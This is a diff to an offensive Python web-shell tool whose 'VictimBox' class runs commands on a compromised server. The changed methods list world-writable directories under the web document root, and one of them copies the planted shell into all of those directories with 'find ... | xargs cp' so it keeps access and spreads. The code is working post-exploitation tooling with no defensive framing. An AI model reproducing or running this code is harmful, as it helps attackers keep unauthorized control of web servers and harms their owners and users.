@@ -1,6 +1,7 @@
 from urllib2 import urlopen, URLError
 from request_handler import make_request
 from menu import Colors, getargs
+from linux_version import linux
 
 
 class VictimBox(object):
@@ -60,7 +61,8 @@ class VictimBox(object):
 
     # a method to get all writable directories within CWD
     def get_writable(self):
-        make_request.cmd = "find {} -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print".format(self.source[3])
+        make_request.cmd = "find {0} -depth -perm -0002 -type d".format(linux.get_doc_root())
+        print make_request.cmd
         self.writables = map(str.strip, make_request.get_page_source().readlines())
         c = 1
         for path in self.writables:
@@ -71,7 +73,7 @@ class VictimBox(object):
     def spread_shell(self):
         provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
         shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
-        make_request.cmd = 'find {0} -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {1}'.format(self.source[3], shell_name)
+        make_request.cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp {1}'.format(linux.get_doc_root(), shell_name)
         print make_request.get_page_source().read()
         print '[+] Successfully spread {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)
 
